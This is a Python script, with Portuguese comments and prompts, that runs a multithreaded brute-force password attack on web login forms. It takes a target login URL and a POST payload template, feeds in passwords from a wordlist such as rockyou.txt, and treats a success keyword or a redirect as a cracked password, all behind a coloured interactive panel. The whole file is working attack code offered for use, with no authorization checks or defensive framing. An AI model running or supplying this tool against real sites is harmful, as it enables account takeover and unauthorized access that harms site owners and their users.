import requests
import threading
import queue
import time
import sys
import os

# Cores ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
GRAY = "\033[90m"
RESET = "\033[0m"
BOLD = "\033[1m"
UNDER = "\033[4m"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def painel_infos():
    clear()
    print(f"{CYAN}{BOLD}{'='*54}")
    print(f"      BRUTE FORCE PYTHON - PAINEL INTERATIVO COLORIDO")
    print(f"{'='*54}{RESET}")
    print(f"{YELLOW}- Para {BOLD}INICIAR{RESET}{YELLOW}, pressione [{BOLD}ENTER{RESET}{YELLOW}]")
    print(f"- Para {BOLD}PARAR{RESET}{YELLOW} a qualquer momento, pressione [{BOLD}ENTER{RESET}{YELLOW}] novamente")
    print(f"- Logs: {GREEN}Verde = SUCESSO{RESET}  {RED}Vermelho = FALHA{RESET}  {CYAN}Amarelo = Progresso{RESET}")
    print(f"{'='*54}{RESET}\n")
    input(f"{CYAN}Pressione [{BOLD}ENTER{RESET}{CYAN}] para começar...{RESET}")

def get_input(label, default=None):
    val = input(f"{BOLD}{label}{f' [{default}]' if default else ''}:{RESET} ")
    return val.strip() if val.strip() else (default if default else '')

def verbose_log(senha, ok, motivo, resposta, show_full=False):
    cor = GREEN if ok else RED
    tag = f"{cor}{BOLD}{'OK✅' if ok else 'FAIL❌'}{RESET}"
    print(f"{BOLD}SENHA:{RESET} {CYAN}{senha}{RESET}   {tag}  {GRAY}Motivo:{RESET} {motivo}")
    if show_full and resposta:
        resposta_visivel = resposta.replace("\r","").replace("\n"," ")[:240]
        print(f"    {YELLOW}RESPOSTA:{RESET} {resposta_visivel}")

def worker(q, url, payload, filtro, found, tested, lock, show_full, detect_redirect):
    session = requests.Session()
    while not found[0]:
        try:
            senha = q.get_nowait()
        except queue.Empty:
            return
        data = payload.replace('$', senha)
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            r = session.post(url, data=data, headers=headers, timeout=10, allow_redirects=not detect_redirect)
            resposta = r.text
            motivo = ''
            ok = False
            if filtro:
                ok = filtro.lower() in resposta.lower()
                motivo = f"Filtro '{filtro}' {'encontrado' if ok else 'não encontrado'}"
            else:
                if detect_redirect and (r.is_redirect or r.status_code in [301,302,303,307,308]):
                    ok = True
                    motivo = f"Redirecionado para {r.headers.get('Location','(desconhecido)')}"
                elif r.url != url:
                    ok = True
                    motivo = f"URL mudou para {r.url}"
                else:
                    motivo = f"Status {r.status_code}"
            with lock:
                verbose_log(senha, ok, motivo, resposta, show_full)
            tested[0] += 1
            if ok:
                with lock:
                    print(f"\n{GREEN}{BOLD}=== SENHA ENCONTRADA: {senha} ==={RESET}\n")
                found[0] = True
                break
        except Exception as e:
            with lock:
                print(f"{RED}SENHA: {senha}   ERRO: {e}{RESET}")

def monitor_stop(found):
    input()
    found[0] = True
    print(f"\n{YELLOW}{BOLD}[PAINEL]{RESET} Ataque interrompido pelo usuário. Encerrando threads...")

def main():
    print(f"{CYAN}{BOLD}=== Brute Force Python (auto detect) ==={RESET}")
    url = get_input("URL do login (ex: https://site.com/login)")
    payload = get_input("Payload POST (use $ para senha, ex: username=admin&password=$)")
    wordlist = get_input("Wordlist (ex: rockyou.txt)")
    filtro = get_input("Palavra-chave de SUCESSO (opcional, ex: Bem-vindo)", "")
    threads = int(get_input("Quantos threads (ex: 20)", "20"))
    show_full = get_input("Mostrar resposta do site? (s/N)", "N").lower() == "s"
    detect_redirect = get_input("Detectar sucesso por redirecionamento? (S/n)", "S").lower() != "n"

    try:
        with open(wordlist, "r", encoding="latin1") as f:
            senhas = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{RED}Erro ao ler wordlist: {e}{RESET}")
        sys.exit(1)

    painel_infos()

    print(f"{CYAN}Iniciando brute force em {url} com {len(senhas)} senhas...{RESET}")

    q = queue.Queue()
    for s in senhas:
        q.put(s)

    found = [False]
    tested = [0]
    lock = threading.Lock()
    t0 = time.time()

    threads_list = []
    for _ in range(threads):
        thr = threading.Thread(target=worker, args=(q, url, payload, filtro, found, tested, lock, show_full, detect_redirect))
        thr.daemon = True
        thr.start()
        threads_list.append(thr)

    monitor = threading.Thread(target=monitor_stop, args=(found,))
    monitor.daemon = True
    monitor.start()

    total = len(senhas)
    try:
        while any(t.is_alive() for t in threads_list):
            time.sleep(0.7)
            with lock:
                pc = int(100*tested[0]/total) if total else 0
                print(f"\r{YELLOW}Progresso: {tested[0]}/{total} ({pc}%) {RESET}", end='', flush=True)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}{BOLD}[PAINEL]{RESET} Ctrl+C detectado. Encerrando...")
        found[0] = True

    print(f"\n{CYAN}{BOLD}Finalizado! {tested[0]} senhas testadas em {time.time()-t0:.1f}s.{RESET}")

if __name__ == "__main__":
    main()